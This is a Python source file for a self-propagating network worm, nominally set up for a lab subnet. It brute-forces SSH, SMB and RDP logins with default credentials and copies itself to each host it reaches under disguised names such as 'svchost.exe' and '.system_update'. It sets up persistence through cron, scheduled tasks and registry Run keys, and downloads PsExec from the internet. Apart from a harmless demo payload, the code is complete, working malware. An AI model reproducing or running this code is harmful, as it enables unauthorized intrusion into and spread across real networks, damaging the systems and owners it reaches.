import os
import sys
import socket
import shutil
import threading
import paramiko
import subprocess
from pathlib import Path
from time import sleep
from concurrent.futures import ThreadPoolExecutor
import ipaddress

# Lab Network Configuration
SCAN_SUBNET = "192.168.1.0/24"
KNOWN_PORTS = [22, 445, 3389]
CREDS = [
    ('administrator', 'P@ssw0rd'),
    ('admin', 'Admin123'),
    ('user', 'Welcome1')
]
SHARED_FOLDERS = ['C$', 'ADMIN$', 'Shared']  # Common SMB shares


class NetworkWorm:
    def __init__(self):
        self.infected_hosts = set()
        self.scan_semaphore = threading.Semaphore(3)
        self.worm_path = Path(__file__).resolve()

    def spread(self):
        """Main propagation method"""
        print("[*] Starting network scan...")
        self.scan_network()
        self.execute_payload()

    def scan_network(self):
        """Network discovery with CIDR scanning"""
        network = ipaddress.ip_network(SCAN_SUBNET)
        with ThreadPoolExecutor(max_workers=15) as executor:
            list(executor.map(self.check_host, [str(ip) for ip in network.hosts()]))

    def check_host(self, ip):
        """Service discovery with banner grabbing"""
        with self.scan_semaphore:
            for port in KNOWN_PORTS:
                try:
                    with socket.create_connection((ip, port), timeout=2):
                        print(f"[+] Found open {self.port_service(port)} on {ip}")
                        self.attempt_infection(ip, port)
                except:
                    continue

    def port_service(self, port):
        """Map ports to service names"""
        return {
            22: 'SSH',
            445: 'SMB',
            3389: 'RDP'
        }.get(port, str(port))

    def attempt_infection(self, ip, port):
        """Multi-vector infection system"""
        if self.is_already_infected(ip):
            return

        try:
            if port == 22:
                self.infect_via_ssh(ip)
            elif port == 445:
                self.infect_via_smb(ip)
            elif port == 3389:
                self.infect_via_rdp(ip)
        except Exception as e:
            print(f"[-] Infection failed on {ip}: {str(e)}")

    def infect_via_ssh(self, ip):
        """SSH-based infection with credential brute-forcing"""
        for user, passwd in CREDS:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=user, password=passwd, timeout=5)

                print(f"[*] Successful login {user}:{passwd} on {ip}")

                # Upload worm
                sftp = ssh.open_sftp()
                sftp.put(__file__, "/tmp/.system_update")

                # Set persistence
                ssh.exec_command("chmod +x /tmp/.system_update")
                ssh.exec_command("echo '@reboot /tmp/.system_update' | crontab -")

                # Immediate execution
                ssh.exec_command("nohup /tmp/.system_update &")

                self.infected_hosts.add(ip)
                ssh.close()
                return
            except Exception as e:
                continue

    def infect_via_smb(self, ip):
        """SMB propagation using network shares"""
        print(f"[*] Attempting SMB propagation to {ip}")

        # Try administrative shares
        for share in SHARED_FOLDERS:
            dest_path = fr"\\{ip}\{share}\Windows\System32\update.exe"
            try:
                shutil.copyfile(self.worm_path, dest_path)
                print(f"[!] Copied worm to {dest_path}")

                # Schedule execution via schtasks
                subprocess.run([
                    'schtasks', '/create', '/s', ip, '/tn', 'SystemUpdate',
                    '/tr', dest_path, '/sc', 'ONSTART', '/ru', 'SYSTEM',
                    '/f'
                ], check=True)

                self.infected_hosts.add(ip)
                return
            except Exception as e:
                continue

    def infect_via_rdp(self, ip):
        """RDP-based propagation using PsExec"""
        print(f"[*] Attempting RDP-based attack on {ip}")

        try:
            # Download PsExec if missing
            if not Path("PsExec.exe").exists():
                subprocess.run([
                    'curl', '-O', 'https://live.sysinternals.com/tools/PsExec.exe'
                ], check=True)

            # Copy worm to target
            subprocess.run([
                'PsExec.exe', f'\\{ip}', '-accepteula', '-s',
                'cmd.exe', '/c', f'copy {self.worm_path} C:\\Windows\\Temp\\svchost.exe'
            ], check=True)

            # Create scheduled task
            subprocess.run([
                'PsExec.exe', f'\\{ip}', '-accepteula', '-s',
                'schtasks.exe', '/create', '/tn', 'WindowsUpdate',
                '/tr', 'C:\\Windows\\Temp\\svchost.exe', '/sc', 'ONSTART',
                '/ru', 'SYSTEM', '/f'
            ], check=True)

            self.infected_hosts.add(ip)
        except Exception as e:
            print(f"[-] RDP propagation failed: {str(e)}")

    def is_already_infected(self, ip):
        """Check for existing infection via beacon port"""
        try:
            with socket.create_connection((ip, 31337), timeout=1):
                return True
        except:
            return False

    def execute_payload(self):
        """Benign payload for demonstration"""
        print("[*] Simulating payload execution")
        Path("/tmp/worm_demo.txt").touch()

    def create_persistence(self):
        """Cross-platform persistence mechanisms"""
        if os.name == 'posix':
            os.system("(crontab -l 2>/dev/null; echo '@reboot /tmp/.system_update') | crontab -")
        else:
            os.system(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /t REG_SZ /d "{self.worm_path}"')

    def self_replicate(self):
        """Copy self to critical locations"""
        try:
            if os.name == 'posix':
                shutil.copy(__file__, "/usr/bin/.systemd-daemon")
                os.chmod("/usr/bin/.systemd-daemon", 0o755)
            else:
                appdata = os.getenv('APPDATA')
                shutil.copy(__file__, f"{appdata}\\Microsoft\\Windows\\Start Menu\\svchost.exe")
        except:
            pass

    def stop_worm(self):
        """Cleanup mechanism"""
        if Path("/tmp/stop_worm").exists():
            if os.name == 'posix':
                os.system("crontab -r")
            else:
                os.system('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /f')
            sys.exit(0)


if __name__ == "__main__":
    worm = NetworkWorm()
    worm.self_replicate()
    worm.create_persistence()

    while True:
        worm.stop_worm()
        worm.spread()
        sleep(300)  # Propagate every 5 minutes